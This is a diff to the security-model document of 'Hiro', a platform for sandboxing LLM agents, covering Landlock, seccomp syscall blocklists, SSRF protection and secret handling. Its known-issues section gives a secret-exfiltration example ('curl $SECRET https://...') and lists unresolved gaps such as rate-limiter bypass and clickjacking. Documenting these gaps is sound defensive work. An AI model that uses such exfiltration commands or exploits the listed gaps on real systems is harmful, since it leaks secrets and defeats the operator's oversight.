@@ -1,6 +1,6 @@
 # Security Model
 
-Hiro runs untrusted LLM-driven agents that can execute arbitrary code. The security model uses defense in depth: Docker containment at the outer boundary, OS-level process and user isolation between agents, and a capability system that restricts what tools each agent can use.
+Hiro runs untrusted LLM-driven agents that can execute arbitrary code. The security model uses defense in depth: Docker containment at the outer boundary, Landlock and seccomp-BPF isolation between agents, and a capability system that restricts what tools each agent can use. The entire stack runs unprivileged — no root, no capabilities, no namespaces.
 
 ## Architecture Overview
 
@@ -8,19 +8,20 @@ Hiro runs untrusted LLM-driven agents that can execute arbitrary code. The secur
 ┌─────────────────────────────────────────────────────┐
 │ Docker Container (outer boundary)                   │
 │                                                     │
-│  Control Plane (root)                               │
-│  ├── config.yaml (0600, secrets + tool policies)    │
+│  Control Plane (USER hiro)                          │
+│  ├── config/config.yaml (secrets + tool policies)   │
 │  ├── Inference loops (fantasy agent per instance)    │
+│  ├── WebFetch (SSRF-protected HTTP client)          │
 │  └── Instance lifecycle management                  │
 │                                                     │
 │  ┌──────────────┐  ┌──────────────┐                 │
-│  │ Agent (UID A) │  │ Agent (UID B) │  ...           │
-│  │ instances/a/  │  │ instances/b/  │               │
-│  │ (0700, own)   │  │ (0700, own)   │               │
+│  │ Agent Worker  │  │ Agent Worker  │  ...           │
+│  │ Landlock FS   │  │ Landlock FS   │               │
+│  │ seccomp-BPF   │  │ seccomp-BPF   │               │
 │  └──────────────┘  └──────────────┘                 │
 │                                                     │
-│  /hiro (2775, setgid hiro-agents)                   │
-│  ├── agents/, skills/ (hiro-operators)           │
+│  /hiro                                              │
+│  ├── agents/, skills/ (agent definitions)           │
 │  └── workspace/ (shared collaborative space)        │
 └─────────────────────────────────────────────────────┘
 ```
@@ -31,7 +32,7 @@ Hiro runs untrusted LLM-driven agents that can execute arbitrary code. The secur
 
 The Docker container is the outermost security boundary. The host filesystem, network, and processes are not accessible to agents unless explicitly mounted or exposed.
 
-The container runs Ubuntu 24.04 with common dev tools (git, curl, build-essential, ripgrep, etc.) pre-installed. The control plane runs as root inside the container to manage UID switching. The platform root starts empty — operators mount or copy in only what agents need.
+The container runs Ubuntu 24.04 with common dev tools (git, curl, build-essential, ripgrep, etc.) pre-installed. The Dockerfile creates a non-root `hiro` user and runs as `USER hiro` — no root, no special capabilities. The platform root starts empty — operators mount or copy in only what agents need.
 
 ### 2. Process Isolation
 
@@ -40,47 +41,55 @@ Each agent runs as a separate OS process, spawned from the same `hiro` binary wi
 **Spawn protocol:**
 
 1. Control plane calls `os/exec.Command("hiro", "agent")` with a dedicated Unix socket path.
-2. `SpawnConfig` (instance ID, agent name, tool whitelist, socket paths, etc.) is written as JSON to the child's stdin.
-3. The agent process starts a gRPC server on its Unix socket and writes `ready` to stdout.
-4. The control plane connects to the agent's socket as a gRPC client.
+2. `SpawnConfig` (instance ID, agent name, tool whitelist, socket paths, Landlock paths, network access flag) is written as JSON to the child's stdin.
+3. The worker applies Landlock filesystem restrictions and seccomp-BPF filter.
+4. The worker starts a gRPC server on its Unix socket and writes `ready` to stdout.
+5. The control plane connects to the agent's socket as a gRPC client.
 
-Worker processes are thin tool-execution sandboxes — they receive `ExecuteTool` RPCs and run tools under the isolated UID. All inference (LLM calls, conversation history, system prompt assembly) happens in the control plane.
+Worker processes are thin tool-execution sandboxes — they receive `ExecuteTool` RPCs and run tools. All inference (LLM calls, conversation history, system prompt assembly) happens in the control plane.
 
-### 3. Unix User Isolation
+**Environment scrubbing:** Agent processes receive a minimal environment (`PATH`, `HOME={session-dir}`, `LANG`, `LC_ALL`, `MISE_DATA_DIR`, `MISE_CONFIG_DIR`, `MISE_CACHE_DIR`, `MISE_GLOBAL_CONFIG_FILE`) rather than inheriting the control plane's full environment. Workers explicitly do not receive `HIRO_API_KEY` — inference runs in the control plane, not in workers. Setting `HOME` to the session directory gives each agent an isolated home for dotfiles, caches, and temp data.
 
-When running in Docker, each agent process runs as a dedicated Unix user from a pre-created pool. This provides OS-enforced file access control between agents.
+### 3. Landlock Filesystem Isolation
 
-**Setup:**
+Landlock LSM restricts each worker process to only the filesystem paths it needs. This is an unprivileged alternative to chroot/mount namespaces — no root or capabilities required.
 
-- A `hiro-agents` group (GID 10000) and 64 users (`hiro-agent-0` through `hiro-agent-63`, UIDs 10000–10063) are created in the Dockerfile.
-- A `hiro-operators` group (GID 10001) is created for operator-mode agents.
-- At startup, the control plane checks for the `hiro-agents` group. If present, UID isolation is enabled; if absent (e.g., local development), it is silently disabled.
+**How it works:**
 
-**Per-agent isolation:**
+- At spawn time, the control plane computes Landlock paths based on the agent's instance directory, session directory, and tool set.
+- The worker calls `PR_SET_NO_NEW_PRIVS` (required by both Landlock and seccomp), then applies a Landlock ruleset that whitelists specific paths.
+- Read-write paths: instance directory, session directory, workspace, temp directories.
+- Read-only paths: platform root (agent definitions, skills), system paths (shared tool installations).
+- All other filesystem access is blocked by the kernel. This is irreversible for the process lifetime.
 
-- When an agent starts, the control plane acquires a UID from the pool and spawns the child in its own user namespace (`CLONE_NEWUSER`) with UID/GID mappings (UID 0 inside → agent UID outside).
-- The agent's instance directory is `chown`ed to its UID:GID before the process starts.
-- Instance directories use `0700` permissions — only the owning agent can read or write its own memory, history, and todos.
-- Operator-mode agents receive `hiro-operators` as a supplementary group via `GidMappings` + `setgroups()` in the child, granting write access to `agents/` and `skills/`.
-- When an agent stops, its UID is released back to the pool.
+**Detection:** The control plane probes for Landlock support at startup. If the kernel is too old (pre-5.13), Landlock is silently disabled. In Docker with a modern kernel, it is always available.
 
-**Environment scrubbing:** Under UID isolation, the agent process receives a minimal environment (`PATH`, `HOME={instance-dir}`, `LANG`, `LC_ALL`, `MISE_DATA_DIR`, `MISE_CONFIG_DIR`, `MISE_CACHE_DIR`, `MISE_GLOBAL_CONFIG_FILE`) rather than inheriting the control plane's full environment. Workers explicitly do not receive `HIRO_API_KEY` — inference runs in the control plane, not in workers. Setting `HOME` to the instance directory gives each agent an isolated home for dotfiles, caches, and temp data.
+**Implementation:** `internal/landlock/` (~110 LOC) wraps the Landlock v1 syscalls. Linux-only (`//go:build linux`); stubs return errors on other platforms.
 
-### 4. File System Permissions
+### 4. Seccomp-BPF Syscall Filtering
 
-| Path | Mode | Owner | Access |
-|---|---|---|---|
-| `config.yaml` | `0600` | root | Control plane only. Contains secrets and tool policies. Unreadable by agent users. |
-| `/hiro` | `2775` (setgid) | root:hiro-agents | Platform root. All agents can read and write. New files inherit the `hiro-agents` group. |
-| `agents/` | `2775` (setgid) | root:hiro-operators | Agent definitions. Readable by all (via "other" bits), writable by operator agents only. |
-| `skills/` | `2775` (setgid) | root:hiro-operators | Shared skills. Same access as `agents/`. |
-| `workspace/` | `2775` (setgid) | root:hiro-agents | Shared collaborative space. All agents can read and write. New files inherit the `hiro-agents` group. |
-| `instances/{id}/` | `0700` | agent-user | Private per-agent data (memory, identity, sessions with todos, scratch, tmp). Only the owning agent can access. |
-| `db/hiro.db` | default | root | Unified platform database (instances, sessions, messages, usage). Accessed only by the control plane process. |
-| `/opt/mise/` | `r-x` (group) | root:hiro-agents | Shared tool installations (mise, node, python, etc.). Read-only for agents; new tools should be installed in per-instance directories. |
-| Agent socket | `0600` | agent-user | gRPC server for control plane→worker calls. Located at `/tmp/hiro-{session-prefix}/a.sock` (directory `0700`, owned by agent UID). |
+Each worker process installs a seccomp-BPF filter that blocks dangerous syscalls. The filter is applied per-worker at startup, after Landlock but before the gRPC server starts.
 
-### 5. Tool Capability System
+**Blocked syscalls (all workers):**
+
+- `clone3`, `unshare`, `setns` — prevent namespace creation
+- `ptrace`, `mount`, `umount2`, `pivot_root`, `chroot` — prevent privilege escalation and filesystem manipulation
+- `kexec_load` — prevent loading a new kernel
+- `process_vm_readv`, `process_vm_writev` — prevent cross-process memory access
+- `io_uring_setup`, `io_uring_enter`, `io_uring_register` — prevent io_uring (can bypass seccomp on some kernels)
+- `shmget`, `shmat`, `shmctl` — prevent SysV shared memory
+
+Additionally, `clone` with `CLONE_NEWUSER` or `CLONE_NEWNET` flags is blocked via argument inspection.
+
+**Network socket blocking:** When `NetworkAccess` is false (the agent does not have the Bash tool), the seccomp filter additionally blocks `socket(AF_INET)` and `socket(AF_INET6)`, preventing all outbound network connections. Agents with Bash need sockets for commands like `curl` and `git`. The `NetworkAccess` flag is derived from the agent's effective tool set at spawn time.
+
+### 5. WebFetch in Control Plane
+
+The `WebFetch` tool runs in the control plane process, not in workers. This gives the control plane full control over outbound HTTP requests without needing to grant workers network access.
+
+**SSRF protection:** The control plane's HTTP client resolves DNS before dialing and blocks connections to loopback, private, and link-local addresses. Redirect targets are also validated against this blocklist. This prevents agents from using WebFetch to reach internal services.
+
+### 6. Tool Capability System
 
 Agent capabilities are controlled by a closed-by-default tool whitelist. An agent can only use a tool if both layers permit it:
 
@@ -88,7 +97,7 @@ Agent capabilities are controlled by a closed-by-default tool whitelist. An agen
 Effective tools = instance declared tools ∩ parent's effective tools
 ```
 
-**Instance tool declarations:** Each instance owns its tool declarations in `config.yaml` (root-owned, `0600`). Tools are seeded from the agent definition (`agent.md`) at creation time and can be modified by the operator via the control plane. If no tools are declared, the agent gets no built-in tools.
+**Instance tool declarations:** Each instance owns its tool declarations in `config/instances/<uuid>.yaml` — stored outside the instance directory so Landlock prevents agents from modifying their own tool config. Tools are seeded from the agent definition (`agent.md`) at creation time and can be modified by the operator via the control plane. If no tools are declared, the agent gets no built-in tools.
 
 **Parent inheritance:** A child agent's effective tools are intersected with its parent's effective tools. A child can never have more capabilities than its parent.
 
@@ -99,9 +108,9 @@ Effective tools = instance declared tools ∩ parent's effective tools
 
 **Parameterized rules:** The `toolrules` package provides fine-grained call-time enforcement beyond tool names. Rules like `Bash(curl *)` restrict which commands an agent can run. Rules are parsed from `allowed_tools` and `disallowed_tools` in agent definitions and operator config. See `docs/tool-permissions.md` for details.
 
-### 6. Secrets Management
+### 7. Secrets Management
 
-Secrets are stored in `config.yaml` (root-only, `0600`) and managed via the `/secrets` slash command in the web UI. They are never sent to agents directly.
+Secrets are stored in `config/config.yaml` and managed via the `/secrets` slash command in the web UI. They are never sent to agents directly.
 
 **How agents use secrets:**
 
@@ -111,7 +120,7 @@ Secrets are stored in `config.yaml` (root-only, `0600`) and managed via the `/se
 
 This design ensures secret values never appear in conversation history, system prompts, or LLM context — only in the ephemeral environment of shell commands.
 
-### 7. Agent Authorization Scoping
+### 8. Agent Authorization Scoping
 
 Agents can only manage their own descendants. This is enforced by the `ScopedManager` wrapper in the inference package.
 
@@ -134,15 +143,15 @@ Agents can only manage their own descendants. This is enforced by the `ScopedMan
 
 An agent cannot send messages to, stop, or inspect siblings, ancestors, or unrelated agents.
 
-### 8. IPC Security
+### 9. IPC Security
 
 All inter-process communication uses gRPC over Unix domain sockets. No TCP ports are opened between workers and the control plane.
 
 **Single socket direction:**
 
-- **Agent sockets** (`/tmp/hiro-{session-prefix}/a.sock`): One per worker. The control plane connects as a client to dispatch `ExecuteTool`, `Shutdown`, and `WatchJobs` (background job completion streaming) RPCs. The socket directory is `0700` owned by the worker's UID, and the socket file is explicitly `chmod 0600` after creation.
+- **Agent sockets** (`/tmp/hiro-{session-prefix}/a.sock`): One per worker. The control plane connects as a client to dispatch `ExecuteTool`, `Shutdown`, and `WatchJobs` (background job completion streaming) RPCs.
 
-There is no worker→control plane socket. All inference, instance management, and operator operations happen in-process in the control plane. Workers are pure tool-execution sandboxes with no ability to initiate calls back to the control plane. The `WatchJobs` RPC is a server-side stream initiated by the control plane to receive background job completion notifications — it does not grant workers any ability to call into the control plane.
+There is no worker-to-control-plane socket. All inference, instance management, and operator operations happen in-process in the control plane. Workers are pure tool-execution sandboxes with no ability to initiate calls back to the control plane. The `WatchJobs` RPC is a server-side stream initiated by the control plane to receive background job completion notifications — it does not grant workers any ability to call into the control plane.
 
 gRPC uses `insecure.NewCredentials()` for transport — this is safe because Unix sockets are local-only.
 
@@ -151,43 +160,40 @@ gRPC uses `insecure.NewCredentials()` for transport — this is safe because Uni
 ### What agents CAN do
 
 - Execute arbitrary shell commands (if granted the `Bash` tool).
-- Read and write files in the shared workspace (`/hiro/workspace/`, mode `2775`).
+- Read and write files in the shared workspace and other Landlock-permitted paths.
 - Read agent definitions (`agents/`).
 - Spawn ephemeral child agents (with equal or fewer capabilities).
-- Make outbound network requests to declared domains only — agents with `network.egress` are confined to those domains via per-agent network namespaces; agents without `network.egress` have no outbound connectivity (default-deny). See [`docs/network-isolation.md`](network-isolation.md).
+- Make outbound HTTP requests via the `WebFetch` tool (SSRF-protected, runs in control plane).
+- Make outbound network connections from Bash commands (if granted the `Bash` tool — seccomp allows sockets for agents with Bash).
 
 ### What agents CANNOT do
 
-- Read other agents' instance data (memory, history, todos) — blocked by `0700` ownership.
-- Read `config.yaml` or secret values directly — blocked by `0600` root ownership.
+- Access files outside their Landlock-permitted paths — blocked by the kernel.
+- Read `config/` directory (secrets, instance tool config) — not in Landlock paths.
 - Manage agents outside their descendant tree — blocked by ScopedManager descendant checks.
-- Use tools they weren't granted — blocked by the three-layer capability intersection.
-- Write to `agents/` or `skills/` (unless operator mode) — blocked by `hiro-operators` group ownership.
-- Rewrite seeded agent definitions — blocked by `0644` root ownership on seeded files.
+- Use tools they weren't granted — blocked by the capability intersection.
+- Open network sockets without Bash — blocked by seccomp-BPF socket filter.
 - Escape the Docker container — standard container isolation applies.
+- Escalate privileges — `PR_SET_NO_NEW_PRIVS` is set, container runs as non-root.
 
 ### What the control plane trusts
 
 - The Docker runtime and host kernel.
 - The LLM provider API (API keys are sent to it).
-- Operator-provided `config.yaml` and agent definitions.
+- Operator-provided `config/config.yaml` and agent definitions.
 
 ### Limitations
 
-- **Network isolation is domain-level, not IP-level.** All agents spawn in per-agent network namespaces (default-deny). Agents with `network.egress` can reach declared domains via DNS-driven nftables rules; agents without it have no outbound connectivity. If an allowed domain shares an IP with a blocked domain (CDN co-hosting), the agent can reach both. Requires `CAP_NET_ADMIN` on the container. See [`docs/network-isolation.md`](network-isolation.md) for the full design.
-- **Shared workspace is collaborative.** Any agent can read or modify files in `/hiro/workspace/`. This is by design for multi-agent collaboration, but means agents must be trusted not to tamper with shared data maliciously.
-- **UID pool is finite.** With 64 UIDs, a maximum of 64 concurrent agents can be isolated. Exhaustion returns an error, not a degraded mode.
+- **Landlock requires kernel 5.13+.** On older kernels, filesystem isolation is silently disabled. Modern Docker hosts (Ubuntu 22.04+, Debian 12+) have Landlock support.
+- **Shared workspace is collaborative.** Any agent can read or modify files in the workspace. This is by design for multi-agent collaboration, but means agents must be trusted not to tamper with shared data maliciously.
+- **Agents with Bash have network access.** The seccomp filter only blocks sockets for agents without Bash. Agents with Bash can make arbitrary outbound connections. Use tool rules (`Bash(curl *)`) to restrict which commands agents can run.
 
 ### Known Issues
 
 The following are known security gaps identified during audit, tracked for future resolution:
 
-- **Secret exfiltration via outbound Bash.** An agent with Bash access can read `$SECRET` and send it outbound (e.g., `curl $SECRET https://...`) in a single command. The output redactor cannot catch values sent outbound rather than returned as output. Network isolation (`network.egress`) is the primary mitigation — agents that handle sensitive secrets should have restricted egress.
-- **~~Secrets sent for all tool calls.~~** Resolved. Secret env vars are now only included in `ExecuteTool` requests for the `Bash` tool. Other tools receive no secrets.
+- **Secret exfiltration via outbound Bash.** An agent with Bash access can read `$SECRET` and send it outbound (e.g., `curl $SECRET https://...`) in a single command. The output redactor cannot catch values sent outbound rather than returned as output. Use tool rules to restrict which Bash commands agents can run.
 - **Short secret redaction floor.** The output redactor only scrubs secrets with values of 8+ characters (`minSecretLen`). Shorter secrets (PINs, short tokens) may appear unredacted in tool output and conversation history.
-- **~~Session cookie lacks `Secure` flag.~~** Resolved. The `hiro_session` cookie now dynamically sets the `Secure` flag when the request arrives over TLS (direct or via trusted proxy with `X-Forwarded-Proto: https`).
 - **Incomplete security response headers.** `Content-Security-Policy` and `X-Content-Type-Options` are set on share and log endpoints, but not globally. `X-Frame-Options` is not set on any endpoint. A clickjacking attack is possible if the dashboard is embedded in an iframe on an attacker-controlled page.
 - **Share tokens do not expire.** File share tokens are valid for the lifetime of the session secret (rotated on password change). There is no per-token TTL.
-- **~~Share token key reuse.~~** Resolved. The share token AES-GCM key is now derived from the session signing secret via HKDF with a dedicated info string (`hiro-share-token-v1`).
 - **Rate limiter trusts `X-Forwarded-For` from private peers.** When behind a proxy that doesn't sanitize `X-Forwarded-For`, an attacker can inject arbitrary IPs to bypass the login rate limiter.
-- **~~Swarm code entropy.~~** Resolved. Swarm codes are now 12 characters (~60 bits of entropy), making brute-force infeasible.
